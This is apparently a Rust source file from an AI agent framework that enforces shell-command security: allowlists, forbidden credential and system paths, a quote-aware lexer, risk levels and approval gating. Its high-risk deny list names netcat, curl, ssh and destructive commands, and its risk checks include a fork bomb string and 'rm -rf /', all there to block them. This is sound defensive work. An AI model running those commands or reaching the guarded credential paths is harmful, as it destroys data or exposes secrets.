use parking_lot::Mutex;
use reqwest::Url;
use schemars::JsonSchema;
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use std::time::Instant;

/// How much autonomy the agent has
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "lowercase")]
pub enum AutonomyLevel {
    /// Read-only: can observe but not act
    ReadOnly,
    /// Supervised: acts but requires approval for risky operations
    #[default]
    Supervised,
    /// Full: autonomous execution within policy bounds
    Full,
}

impl std::str::FromStr for AutonomyLevel {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_ascii_lowercase().as_str() {
            "read_only" | "readonly" => Ok(Self::ReadOnly),
            "supervised" => Ok(Self::Supervised),
            "full" => Ok(Self::Full),
            _ => Err(format!(
                "invalid autonomy level '{s}': expected read_only, supervised, or full"
            )),
        }
    }
}

/// Risk score for shell command execution.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommandRiskLevel {
    Low,
    Medium,
    High,
}

/// Classifies whether a tool operation is read-only or side-effecting.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ToolOperation {
    Read,
    Act,
}

/// Action applied when a command context rule matches.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommandContextRuleAction {
    Allow,
    Deny,
    RequireApproval,
}

/// Context-aware allow/deny rule for shell commands.
#[derive(Debug, Clone)]
pub struct CommandContextRule {
    pub command: String,
    pub action: CommandContextRuleAction,
    pub allowed_domains: Vec<String>,
    pub allowed_path_prefixes: Vec<String>,
    pub denied_path_prefixes: Vec<String>,
    pub allow_high_risk: bool,
}

/// Sliding-window action tracker for rate limiting.
#[derive(Debug)]
pub struct ActionTracker {
    /// Timestamps of recent actions (kept within the last hour).
    actions: Mutex<Vec<Instant>>,
}

impl ActionTracker {
    pub fn new() -> Self {
        Self {
            actions: Mutex::new(Vec::new()),
        }
    }

    /// Record an action and return the current count within the window.
    pub fn record(&self) -> usize {
        let mut actions = self.actions.lock();
        let cutoff = Instant::now()
            .checked_sub(std::time::Duration::from_secs(3600))
            .unwrap_or_else(Instant::now);
        actions.retain(|t| *t > cutoff);
        actions.push(Instant::now());
        actions.len()
    }

    /// Count of actions in the current window without recording.
    pub fn count(&self) -> usize {
        let mut actions = self.actions.lock();
        let cutoff = Instant::now()
            .checked_sub(std::time::Duration::from_secs(3600))
            .unwrap_or_else(Instant::now);
        actions.retain(|t| *t > cutoff);
        actions.len()
    }
}

impl Clone for ActionTracker {
    fn clone(&self) -> Self {
        let actions = self.actions.lock();
        Self {
            actions: Mutex::new(actions.clone()),
        }
    }
}

/// Security policy enforced on all tool executions
#[derive(Debug, Clone)]
pub struct SecurityPolicy {
    pub autonomy: AutonomyLevel,
    pub workspace_dir: PathBuf,
    pub workspace_only: bool,
    pub allowed_commands: Vec<String>,
    pub command_context_rules: Vec<CommandContextRule>,
    pub forbidden_paths: Vec<String>,
    pub allowed_roots: Vec<PathBuf>,
    pub max_actions_per_hour: u32,
    pub max_cost_per_day_cents: u32,
    pub require_approval_for_medium_risk: bool,
    pub block_high_risk_commands: bool,
    pub shell_env_passthrough: Vec<String>,
    pub allow_sensitive_file_reads: bool,
    pub allow_sensitive_file_writes: bool,
    pub tracker: ActionTracker,
    pub custom_security_prompt: String,
}

impl Default for SecurityPolicy {
    fn default() -> Self {
        Self {
            autonomy: AutonomyLevel::Supervised,
            workspace_dir: PathBuf::from("."),
            workspace_only: true,
            allowed_commands: vec![
                "git".into(),
                "npm".into(),
                "cargo".into(),
                "mkdir".into(),
                "touch".into(),
                "cp".into(),
                "mv".into(),
                "ls".into(),
                "cat".into(),
                "grep".into(),
                "find".into(),
                "echo".into(),
                "pwd".into(),
                "wc".into(),
                "head".into(),
                "tail".into(),
                "date".into(),
                "journalctl".into(),
            ],
            command_context_rules: Vec::new(),
            forbidden_paths: vec![
                // System directories (blocked even when workspace_only=false)
                "/etc".into(),
                "/root".into(),
                "/home".into(),
                "/usr".into(),
                "/bin".into(),
                "/sbin".into(),
                "/lib".into(),
                "/opt".into(),
                "/boot".into(),
                "/dev".into(),
                "/proc".into(),
                "/sys".into(),
                "/var".into(),
                "/tmp".into(),
                "/mnt".into(),
                // Sensitive dotfiles
                "~/.ssh".into(),
                "~/.gnupg".into(),
                "~/.aws".into(),
                "~/.config".into(),
            ],
            allowed_roots: Vec::new(),
            max_actions_per_hour: 100,
            max_cost_per_day_cents: 1000,
            require_approval_for_medium_risk: true,
            block_high_risk_commands: true,
            shell_env_passthrough: vec![],
            allow_sensitive_file_reads: false,
            allow_sensitive_file_writes: false,
            tracker: ActionTracker::new(),
            custom_security_prompt: String::new(),
        }
    }
}

fn home_dir() -> Option<PathBuf> {
    std::env::var_os("HOME").map(PathBuf::from)
}

fn expand_user_path(path: &str) -> PathBuf {
    if path == "~" {
        if let Some(home) = home_dir() {
            return home;
        }
    }

    if let Some(stripped) = path.strip_prefix("~/") {
        if let Some(home) = home_dir() {
            return home.join(stripped);
        }
    }

    PathBuf::from(path)
}

fn rootless_path(path: &Path) -> Option<PathBuf> {
    let mut relative = PathBuf::new();

    for component in path.components() {
        match component {
            std::path::Component::Prefix(_)
            | std::path::Component::RootDir
            | std::path::Component::CurDir => {}
            std::path::Component::ParentDir => return None,
            std::path::Component::Normal(part) => relative.push(part),
        }
    }

    if relative.as_os_str().is_empty() {
        None
    } else {
        Some(relative)
    }
}

// ── Shell Command Parsing Utilities ───────────────────────────────────────
// These helpers implement a minimal quote-aware shell lexer. They exist
// because security validation must reason about the *structure* of a
// command (separators, operators, quoting) rather than treating it as a
// flat string — otherwise an attacker could hide dangerous sub-commands
// inside quoted arguments or chained operators.
/// Skip leading environment variable assignments (e.g. `FOO=bar cmd args`).
/// Returns the remainder starting at the first non-assignment word.
fn skip_env_assignments(s: &str) -> &str {
    let mut rest = s;
    loop {
        let Some(word) = rest.split_whitespace().next() else {
            return rest;
        };
        // Environment assignment: contains '=' and starts with a letter or underscore
        if word.contains('=')
            && word
                .chars()
                .next()
                .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        {
            // Advance past this word
            rest = rest[word.len()..].trim_start();
        } else {
            return rest;
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum QuoteState {
    None,
    Single,
    Double,
}

/// Strip heredoc bodies from a command string so that security checks only
/// validate the command itself, not inline script content.
///
/// Recognises `<<DELIM`, `<<-DELIM`, `<< 'DELIM'`, `<< "DELIM"` forms.
/// The heredoc body (everything from the line after the `<<` up to and
/// including the closing delimiter line) is removed. The command portion
/// on the `<<` line is preserved.
fn strip_heredoc_bodies(command: &str) -> String {
    let lines: Vec<&str> = command.split('\n').collect();
    let mut result = Vec::new();
    let mut i = 0;

    while i < lines.len() {
        let line = lines[i];

        // Look for an unquoted `<<` operator on this line.
        if let Some(delimiter) = extract_heredoc_delimiter(line) {
            // Keep the command portion of this line (everything before/including <<DELIM)
            result.push(line);
            i += 1;

            // Skip lines until we find the closing delimiter (inclusive).
            while i < lines.len() {
                let body_line = lines[i];
                i += 1;
                // For <<- the delimiter can be preceded by tabs; for << it
                // must match exactly.  We accept both: trim leading
                // whitespace when comparing.
                if body_line.trim() == delimiter {
                    break;
                }
            }
        } else {
            result.push(line);
            i += 1;
        }
    }

    result.join("\n")
}

/// Try to extract a heredoc delimiter from a line containing `<<`.
/// Returns `None` if the line does not contain an unquoted heredoc operator.
fn extract_heredoc_delimiter(line: &str) -> Option<String> {
    let mut chars = line.chars().peekable();
    let mut quote = QuoteState::None;
    let mut escaped = false;

    while let Some(ch) = chars.next() {
        match quote {
            QuoteState::Single => {
                if ch == '\'' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::Double => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::None => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                if ch == '\'' {
                    quote = QuoteState::Single;
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::Double;
                    continue;
                }

                if ch == '<' && chars.peek() == Some(&'<') {
                    chars.next(); // consume second '<'

                    // Optional '-' for <<-
                    if chars.peek() == Some(&'-') {
                        chars.next();
                    }

                    // Skip whitespace between << and delimiter
                    while chars.peek().is_some_and(|c| *c == ' ' || *c == '\t') {
                        chars.next();
                    }

                    // Read the delimiter word, stripping surrounding quotes
                    let rest: String = chars.collect();
                    let rest = rest.trim();
                    if rest.is_empty() {
                        return None;
                    }

                    // Strip optional surrounding quotes from delimiter
                    let delim = if (rest.starts_with('\'') && rest.ends_with('\''))
                        || (rest.starts_with('"') && rest.ends_with('"'))
                    {
                        rest[1..rest.len() - 1].to_string()
                    } else {
                        // Delimiter may be followed by more text on the same
                        // line (rare but legal).  Take only the first word.
                        rest.split_whitespace().next().unwrap_or("").to_string()
                    };

                    if delim.is_empty() {
                        return None;
                    }

                    return Some(delim);
                }
            }
        }
    }

    None
}

/// Split a string into tokens on unquoted whitespace, keeping quoted
/// regions (single or double) as part of the enclosing token.
///
/// For example, `node -e "import os; print('hi')"` produces
/// `["node", "-e", "\"import os; print('hi')\""]`.
fn split_shell_tokens(s: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut quote = QuoteState::None;
    let mut escaped = false;

    for ch in s.chars() {
        match quote {
            QuoteState::Single => {
                current.push(ch);
                if ch == '\'' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::Double => {
                current.push(ch);
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::None => {
                if escaped {
                    escaped = false;
                    current.push(ch);
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    current.push(ch);
                    continue;
                }
                match ch {
                    '\'' => {
                        quote = QuoteState::Single;
                        current.push(ch);
                    }
                    '"' => {
                        quote = QuoteState::Double;
                        current.push(ch);
                    }
                    c if c.is_whitespace() => {
                        if !current.is_empty() {
                            tokens.push(current.clone());
                            current.clear();
                        }
                    }
                    _ => current.push(ch),
                }
            }
        }
    }

    if !current.is_empty() {
        tokens.push(current);
    }

    tokens
}

/// Split a shell command into sub-commands by unquoted separators.
///
/// Separators:
/// - `;` and newline
/// - `|`
/// - `&&`, `||`
///
/// Characters inside single or double quotes are treated as literals, so
/// `sqlite3 db "SELECT 1; SELECT 2;"` remains a single segment.
fn split_unquoted_segments(command: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut quote = QuoteState::None;
    let mut escaped = false;
    let mut chars = command.chars().peekable();

    let push_segment = |segments: &mut Vec<String>, current: &mut String| {
        let trimmed = current.trim();
        if !trimmed.is_empty() {
            segments.push(trimmed.to_string());
        }
        current.clear();
    };

    while let Some(ch) = chars.next() {
        match quote {
            QuoteState::Single => {
                if ch == '\'' {
                    quote = QuoteState::None;
                }
                current.push(ch);
            }
            QuoteState::Double => {
                if escaped {
                    escaped = false;
                    current.push(ch);
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    current.push(ch);
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::None;
                }
                current.push(ch);
            }
            QuoteState::None => {
                if escaped {
                    escaped = false;
                    current.push(ch);
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    current.push(ch);
                    continue;
                }

                match ch {
                    '\'' => {
                        quote = QuoteState::Single;
                        current.push(ch);
                    }
                    '"' => {
                        quote = QuoteState::Double;
                        current.push(ch);
                    }
                    ';' | '\n' => push_segment(&mut segments, &mut current),
                    '|' => {
                        if chars.next_if_eq(&'|').is_some() {
                            // Consume full `||`; both characters are separators.
                        }
                        push_segment(&mut segments, &mut current);
                    }
                    '&' => {
                        if chars.next_if_eq(&'&').is_some() {
                            // `&&` is a separator; single `&` is handled separately.
                            push_segment(&mut segments, &mut current);
                        } else {
                            current.push(ch);
                        }
                    }
                    _ => current.push(ch),
                }
            }
        }
    }

    let trimmed = current.trim();
    if !trimmed.is_empty() {
        segments.push(trimmed.to_string());
    }

    segments
}

/// Detect a single unquoted `&` operator (background/chain). `&&` is allowed.
///
/// We treat any standalone `&` as unsafe in policy validation because it can
/// chain hidden sub-commands and escape foreground timeout expectations.
fn contains_unquoted_single_ampersand(command: &str) -> bool {
    let mut quote = QuoteState::None;
    let mut escaped = false;
    let mut prev = '\0';
    let mut chars = command.chars().peekable();

    while let Some(ch) = chars.next() {
        match quote {
            QuoteState::Single => {
                if ch == '\'' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::Double => {
                if escaped {
                    escaped = false;
                    prev = ch;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    prev = ch;
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::None => {
                if escaped {
                    escaped = false;
                    prev = ch;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    prev = ch;
                    continue;
                }
                match ch {
                    '\'' => quote = QuoteState::Single,
                    '"' => quote = QuoteState::Double,
                    '&' => {
                        // `&&` is an allowed separator, not a background op.
                        // `>&` (as in `2>&1`) is fd redirection, not background.
                        if chars.next_if_eq(&'&').is_none() && prev != '>' {
                            return true;
                        }
                    }
                    _ => {}
                }
            }
        }
        prev = ch;
    }

    false
}

/// Detect an unquoted character in a shell command.
fn contains_unquoted_char(command: &str, target: char) -> bool {
    let mut quote = QuoteState::None;
    let mut escaped = false;

    for ch in command.chars() {
        match quote {
            QuoteState::Single => {
                if ch == '\'' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::Double => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::None => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                match ch {
                    '\'' => quote = QuoteState::Single,
                    '"' => quote = QuoteState::Double,
                    _ if ch == target => return true,
                    _ => {}
                }
            }
        }
    }

    false
}

/// Detect unquoted shell variable expansions like `$HOME`, `$1`, `$?`.
///
/// Escaped dollars (`\$`) are ignored. Variables inside single quotes are
/// treated as literals and therefore ignored.
fn contains_unquoted_shell_variable_expansion(command: &str) -> bool {
    let mut quote = QuoteState::None;
    let mut escaped = false;
    let chars: Vec<char> = command.chars().collect();

    for i in 0..chars.len() {
        let ch = chars[i];

        match quote {
            QuoteState::Single => {
                if ch == '\'' {
                    quote = QuoteState::None;
                }
                continue;
            }
            QuoteState::Double => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::None;
                    continue;
                }
            }
            QuoteState::None => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                if ch == '\'' {
                    quote = QuoteState::Single;
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::Double;
                    continue;
                }
            }
        }

        if ch != '$' {
            continue;
        }

        let Some(next) = chars.get(i + 1).copied() else {
            continue;
        };
        if next.is_ascii_alphanumeric()
            || matches!(
                next,
                '_' | '{' | '(' | '#' | '?' | '!' | '$' | '*' | '@' | '-'
            )
        {
            return true;
        }
    }

    false
}

fn strip_wrapping_quotes(token: &str) -> &str {
    token.trim_matches(|c| c == '"' || c == '\'')
}

fn looks_like_path(candidate: &str) -> bool {
    candidate.starts_with('/')
        || candidate.starts_with("./")
        || candidate.starts_with("../")
        || candidate.starts_with('~')
        || candidate == "."
        || candidate == ".."
        || candidate.contains('/')
}

fn attached_short_option_value(token: &str) -> Option<&str> {
    // Examples:
    // -f/etc/passwd   -> /etc/passwd
    // -C../outside    -> ../outside
    // -I./include     -> ./include
    let body = token.strip_prefix('-')?;
    if body.starts_with('-') || body.len() < 2 {
        return None;
    }
    let value = body[1..].trim_start_matches('=').trim();
    if value.is_empty() { None } else { Some(value) }
}

fn redirection_target(token: &str) -> Option<&str> {
    let marker_idx = token.find(['<', '>'])?;
    let mut rest = &token[marker_idx + 1..];
    rest = rest.trim_start_matches(['<', '>']);
    rest = rest.trim_start_matches('&');
    rest = rest.trim_start_matches(|c: char| c.is_ascii_digit());
    let trimmed = rest.trim();
    if trimmed.is_empty() {
        None
    } else {
        Some(trimmed)
    }
}

fn is_allowlist_entry_match(allowed: &str, executable: &str, executable_base: &str) -> bool {
    let allowed = strip_wrapping_quotes(allowed).trim();
    if allowed.is_empty() {
        return false;
    }

    // Explicit wildcard support for "allow any command name/path".
    if allowed == "*" {
        return true;
    }

    // Path-like allowlist entries must match the executable token exactly
    // after "~" expansion.
    if looks_like_path(allowed) {
        let allowed_path = expand_user_path(allowed);
        let executable_path = expand_user_path(executable);
        return executable_path == allowed_path;
    }

    // Command-name entries continue to match by basename.
    allowed == executable_base
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SegmentRuleDecision {
    NoMatch,
    Allow,
    Deny,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct SegmentRuleOutcome {
    decision: SegmentRuleDecision,
    allow_high_risk: bool,
    requires_approval: bool,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
struct CommandAllowlistEvaluation {
    high_risk_overridden: bool,
    requires_explicit_approval: bool,
}

fn is_high_risk_base_command(base: &str) -> bool {
    matches!(
        base,
        "rm" | "mkfs"
            | "dd"
            | "shutdown"
            | "reboot"
            | "halt"
            | "poweroff"
            | "sudo"
            | "su"
            | "chown"
            | "chmod"
            | "useradd"
            | "userdel"
            | "usermod"
            | "passwd"
            | "mount"
            | "umount"
            | "iptables"
            | "ufw"
            | "firewall-cmd"
            | "curl"
            | "wget"
            | "nc"
            | "ncat"
            | "netcat"
            | "scp"
            | "ssh"
            | "ftp"
            | "telnet"
    )
}

impl SecurityPolicy {
    fn path_matches_rule_prefix(&self, candidate: &str, prefix: &str) -> bool {
        let normalized_candidate = self.resolve_tool_path(candidate);
        let normalized_prefix = self.resolve_tool_path(prefix);

        normalized_candidate.starts_with(&normalized_prefix)
    }

    fn host_matches_pattern(host: &str, pattern: &str) -> bool {
        let host = host.trim().to_ascii_lowercase();
        let pattern = pattern.trim().to_ascii_lowercase();
        if host.is_empty() || pattern.is_empty() {
            return false;
        }

        if let Some(suffix) = pattern.strip_prefix("*.") {
            host == suffix || host.ends_with(&format!(".{suffix}"))
        } else {
            host == pattern
        }
    }

    fn extract_segment_url_hosts(args: &[&str]) -> Vec<String> {
        args.iter()
            .filter_map(|token| {
                let candidate = strip_wrapping_quotes(token)
                    .trim()
                    .trim_matches(|c: char| matches!(c, ',' | ';'));
                if candidate.is_empty() {
                    return None;
                }
                Url::parse(candidate)
                    .ok()
                    .and_then(|url| url.host_str().map(|host| host.to_ascii_lowercase()))
            })
            .collect()
    }

    fn extract_segment_path_args(args: &[&str]) -> Vec<String> {
        let mut paths = Vec::new();

        for token in args {
            let candidate = strip_wrapping_quotes(token).trim();
            if candidate.is_empty() || candidate.contains("://") {
                continue;
            }

            if let Some(target) = redirection_target(candidate) {
                let normalized = strip_wrapping_quotes(target).trim();
                if !normalized.is_empty() && looks_like_path(normalized) {
                    paths.push(normalized.to_string());
                }
            }

            if candidate.starts_with('-') {
                if let Some((_, value)) = candidate.split_once('=') {
                    let normalized = strip_wrapping_quotes(value).trim();
                    if !normalized.is_empty()
                        && !normalized.contains("://")
                        && looks_like_path(normalized)
                    {
                        paths.push(normalized.to_string());
                    }
                }

                if let Some(value) = attached_short_option_value(candidate) {
                    let normalized = strip_wrapping_quotes(value).trim();
                    if !normalized.is_empty()
                        && !normalized.contains("://")
                        && looks_like_path(normalized)
                    {
                        paths.push(normalized.to_string());
                    }
                }

                continue;
            }

            if looks_like_path(candidate) {
                paths.push(candidate.to_string());
            }
        }

        paths
    }

    fn rule_conditions_match(&self, rule: &CommandContextRule, args: &[&str]) -> bool {
        if !rule.allowed_domains.is_empty() {
            let hosts = Self::extract_segment_url_hosts(args);
            if hosts.is_empty() {
                return false;
            }
            if !hosts.iter().all(|host| {
                rule.allowed_domains
                    .iter()
                    .any(|pattern| Self::host_matches_pattern(host, pattern))
            }) {
                return false;
            }
        }

        let path_args =
            if rule.allowed_path_prefixes.is_empty() && rule.denied_path_prefixes.is_empty() {
                Vec::new()
            } else {
                Self::extract_segment_path_args(args)
            };

        if !rule.allowed_path_prefixes.is_empty() {
            if path_args.is_empty() {
                return false;
            }
            if !path_args.iter().all(|path| {
                rule.allowed_path_prefixes
                    .iter()
                    .any(|prefix| self.path_matches_rule_prefix(path, prefix))
            }) {
                return false;
            }
        }

        if !rule.denied_path_prefixes.is_empty() {
            if path_args.is_empty() {
                return false;
            }
            let has_denied_path = path_args.iter().any(|path| {
                rule.denied_path_prefixes
                    .iter()
                    .any(|prefix| self.path_matches_rule_prefix(path, prefix))
            });
            match rule.action {
                CommandContextRuleAction::Allow | CommandContextRuleAction::RequireApproval => {
                    if has_denied_path {
                        return false;
                    }
                }
                CommandContextRuleAction::Deny => {
                    if !has_denied_path {
                        return false;
                    }
                }
            }
        }

        true
    }

    fn evaluate_segment_context_rules(
        &self,
        executable: &str,
        base_cmd: &str,
        args: &[&str],
    ) -> SegmentRuleOutcome {
        let mut has_allow_rules = false;
        let mut allow_match = false;
        let mut allow_high_risk = false;
        let mut requires_approval = false;

        for rule in &self.command_context_rules {
            if !is_allowlist_entry_match(&rule.command, executable, base_cmd) {
                continue;
            }

            if matches!(rule.action, CommandContextRuleAction::Allow) {
                has_allow_rules = true;
            }

            if !self.rule_conditions_match(rule, args) {
                continue;
            }

            match rule.action {
                CommandContextRuleAction::Deny => {
                    return SegmentRuleOutcome {
                        decision: SegmentRuleDecision::Deny,
                        allow_high_risk: false,
                        requires_approval: false,
                    };
                }
                CommandContextRuleAction::Allow => {
                    allow_match = true;
                    allow_high_risk |= rule.allow_high_risk;
                }
                CommandContextRuleAction::RequireApproval => {
                    requires_approval = true;
                }
            }
        }

        if has_allow_rules {
            if allow_match {
                SegmentRuleOutcome {
                    decision: SegmentRuleDecision::Allow,
                    allow_high_risk,
                    requires_approval,
                }
            } else {
                SegmentRuleOutcome {
                    decision: SegmentRuleDecision::Deny,
                    allow_high_risk: false,
                    requires_approval: false,
                }
            }
        } else {
            SegmentRuleOutcome {
                decision: SegmentRuleDecision::NoMatch,
                allow_high_risk: false,
                requires_approval,
            }
        }
    }

    fn evaluate_command_allowlist(
        &self,
        command: &str,
    ) -> Result<CommandAllowlistEvaluation, String> {
        if self.autonomy == AutonomyLevel::ReadOnly {
            return Err("readonly autonomy level blocks shell command execution".into());
        }

        // Strip heredoc bodies so inline script content is not validated
        // as shell commands.
        let command = &strip_heredoc_bodies(command);

        if command.contains('`')
            || contains_unquoted_shell_variable_expansion(command)
            || command.contains("<(")
            || command.contains(">(")
        {
            return Err("command contains disallowed shell expansion syntax".into());
        }

        if self.block_high_risk_commands
            && (contains_unquoted_char(command, '>') || contains_unquoted_char(command, '<'))
        {
            return Err("command contains disallowed redirection syntax".into());
        }

        if command
            .split_whitespace()
            .any(|w| w == "tee" || w.ends_with("/tee"))
        {
            return Err("command contains disallowed tee usage".into());
        }

        if contains_unquoted_single_ampersand(command) {
            return Err("command contains disallowed background chaining operator '&'".into());
        }

        let segments = split_unquoted_segments(command);
        let mut has_cmd = false;
        let mut saw_high_risk_segment = false;
        let mut all_high_risk_segments_overridden = true;
        let mut requires_explicit_approval = false;

        for segment in &segments {
            let cmd_part = skip_env_assignments(segment);
            let tokens = split_shell_tokens(cmd_part);
            let executable =
                strip_wrapping_quotes(tokens.first().map_or("", |s| s.as_str())).trim();
            let base_cmd = executable.rsplit('/').next().unwrap_or("").trim();

            if base_cmd.is_empty() {
                continue;
            }
            has_cmd = true;

            let args_raw: Vec<&str> = tokens.iter().skip(1).map(|s| s.as_str()).collect();
            let args_lower: Vec<String> = args_raw.iter().map(|w| w.to_ascii_lowercase()).collect();

            let context_outcome =
                self.evaluate_segment_context_rules(executable, base_cmd, &args_raw);
            if context_outcome.decision == SegmentRuleDecision::Deny {
                return Err(format!("context rule denied command segment `{base_cmd}`"));
            }
            requires_explicit_approval |= context_outcome.requires_approval;

            if context_outcome.decision != SegmentRuleDecision::Allow
                && !self
                    .allowed_commands
                    .iter()
                    .any(|allowed| is_allowlist_entry_match(allowed, executable, base_cmd))
            {
                return Err(format!(
                    "command segment `{base_cmd}` is not present in allowed_commands"
                ));
            }

            if !self.is_args_safe(base_cmd, &args_lower) {
                return Err(format!(
                    "command segment `{base_cmd}` contains unsafe arguments"
                ));
            }

            let base_lower = base_cmd.to_ascii_lowercase();
            if is_high_risk_base_command(&base_lower) {
                saw_high_risk_segment = true;
                if !(context_outcome.decision == SegmentRuleDecision::Allow
                    && context_outcome.allow_high_risk)
                {
                    all_high_risk_segments_overridden = false;
                }
            }
        }

        if !has_cmd {
            return Err("command is empty after parsing".into());
        }

        Ok(CommandAllowlistEvaluation {
            high_risk_overridden: saw_high_risk_segment && all_high_risk_segments_overridden,
            requires_explicit_approval,
        })
    }

    // ── Risk Classification ──────────────────────────────────────────────
    // Risk is assessed per-segment (split on shell operators), and the
    // highest risk across all segments wins. This prevents bypasses like
    // `ls && rm -rf /` from being classified as Low just because `ls` is safe.

    /// Classify command risk. Any high-risk segment marks the whole command high.
    pub fn command_risk_level(&self, command: &str) -> CommandRiskLevel {
        let mut saw_medium = false;

        for segment in split_unquoted_segments(command) {
            let cmd_part = skip_env_assignments(&segment);
            let mut words = cmd_part.split_whitespace();
            let Some(base_raw) = words.next() else {
                continue;
            };

            let base = base_raw
                .rsplit('/')
                .next()
                .unwrap_or("")
                .to_ascii_lowercase();

            let args: Vec<String> = words.map(|w| w.to_ascii_lowercase()).collect();
            let joined_segment = cmd_part.to_ascii_lowercase();

            // High-risk commands
            if is_high_risk_base_command(base.as_str()) {
                return CommandRiskLevel::High;
            }

            if joined_segment.contains("rm -rf /")
                || joined_segment.contains("rm -fr /")
                || joined_segment.contains(":(){:|:&};:")
            {
                return CommandRiskLevel::High;
            }

            // Medium-risk commands (state-changing, but not inherently destructive)
            let medium = match base.as_str() {
                "git" => args.first().is_some_and(|verb| {
                    matches!(
                        verb.as_str(),
                        "commit"
                            | "push"
                            | "reset"
                            | "clean"
                            | "rebase"
                            | "merge"
                            | "cherry-pick"
                            | "revert"
                            | "branch"
                            | "checkout"
                            | "switch"
                            | "tag"
                    )
                }),
                "npm" | "pnpm" | "yarn" => args.first().is_some_and(|verb| {
                    matches!(
                        verb.as_str(),
                        "install" | "add" | "remove" | "uninstall" | "update" | "publish"
                    )
                }),
                "cargo" => args.first().is_some_and(|verb| {
                    matches!(
                        verb.as_str(),
                        "add" | "remove" | "install" | "clean" | "publish"
                    )
                }),
                "touch" | "mkdir" | "mv" | "cp" | "ln" => true,
                _ => false,
            };

            saw_medium |= medium;
        }

        if saw_medium {
            CommandRiskLevel::Medium
        } else {
            CommandRiskLevel::Low
        }
    }

    // ── Command Execution Policy Gate ──────────────────────────────────────
    // Validation follows a strict precedence order:
    //   1. Allowlist check (is the base command permitted at all?)
    //   2. Risk classification (high / medium / low)
    //   3. Policy flags and context approval rules
    //      (block_high_risk_commands, require_approval_for_medium_risk,
    //       command_context_rules[action=require_approval])
    //   4. Autonomy level × approval status (supervised requires explicit approval)
    // This ordering ensures deny-by-default: unknown commands are rejected
    // before any risk or autonomy logic runs.

    /// Validate full command execution policy (allowlist + risk gate).
    pub fn validate_command_execution(
        &self,
        command: &str,
        approved: bool,
    ) -> Result<CommandRiskLevel, String> {
        let allowlist_eval = self
            .evaluate_command_allowlist(command)
            .map_err(|reason| format!("Command not allowed by security policy: {reason}"))?;

        if let Some(path) = self.forbidden_path_argument(command) {
            return Err(format!("Path blocked by security policy: {path}"));
        }

        let risk = self.command_risk_level(command);

        if risk == CommandRiskLevel::High {
            if self.block_high_risk_commands && !allowlist_eval.high_risk_overridden {
                let lower = command.to_ascii_lowercase();
                if lower.contains("curl") || lower.contains("wget") {
                    return Err(
                        "Command blocked: high-risk command is disallowed by policy. Shell curl/wget are blocked; use `http_request` or `browser` with configured allowed_domains."
                            .into(),
                    );
                }
                return Err("Command blocked: high-risk command is disallowed by policy".into());
            }
            if self.autonomy == AutonomyLevel::Supervised && !approved {
                return Err(
                    "Command requires explicit approval (approved=true): high-risk operation"
                        .into(),
                );
            }
        }

        if self.autonomy == AutonomyLevel::Supervised
            && allowlist_eval.requires_explicit_approval
            && !approved
        {
            return Err(
                "Command requires explicit approval (approved=true): matched command_context_rules action=require_approval"
                    .into(),
            );
        }

        if risk == CommandRiskLevel::Medium
            && self.autonomy == AutonomyLevel::Supervised
            && self.require_approval_for_medium_risk
            && !approved
        {
            return Err(
                "Command requires explicit approval (approved=true): medium-risk operation".into(),
            );
        }

        Ok(risk)
    }

    // ── Layered Command Allowlist ──────────────────────────────────────────
    // Defence-in-depth: five independent gates run in order before the
    // per-segment allowlist check. Each gate targets a specific bypass
    // technique. If any gate rejects, the whole command is blocked.

    /// Check if a shell command is allowed.
    ///
    /// Validates the **entire** command string, not just the first word:
    /// - Blocks subshell operators (`` ` ``, `$(`) that hide arbitrary execution
    /// - Splits on command separators (`|`, `&&`, `||`, `;`, newlines) and
    ///   validates each sub-command against the allowlist
    /// - Blocks single `&` background chaining (`&&` remains supported)
    /// - Blocks shell redirections (`<`, `>`, `>>`) that can bypass path policy
    /// - Blocks dangerous arguments (e.g. `find -exec`, `git config`)
    pub fn is_command_allowed(&self, command: &str) -> bool {
        self.evaluate_command_allowlist(command).is_ok()
    }

